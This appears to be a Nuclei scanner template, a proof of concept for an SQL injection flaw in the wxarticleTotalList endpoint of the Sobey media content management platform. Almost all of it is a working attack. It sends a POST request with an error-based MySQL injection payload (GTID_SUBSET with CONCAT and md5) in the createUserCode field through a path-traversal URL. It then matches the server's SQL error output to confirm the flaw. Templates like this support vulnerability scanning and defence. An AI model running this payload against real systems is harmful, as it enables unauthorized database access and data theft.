id: poc-yaml-sobey-imcmp-wxarticletotallist-sqli
info:
  name: 索贝融合媒体内容管理平台 wxarticleTotalList SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fingerprint: 索贝融合媒体内容管理平台

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: POST
    path:
      - /sobey-mchEditor/mch/statistics/js/../wxarticleTotalList
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "createUserCode=1' AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(3141=3141,md5({{t1}})))),0x7e),3141) AND 'JXVi'='JXVi&token=1&siteCode=1"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "Sobey"
          - "wxarticleTotalList"
          - "java.sql.SQLException"
        part: body
      - type: regex
        regex:
          - "~{{t2}}~"
        part: body
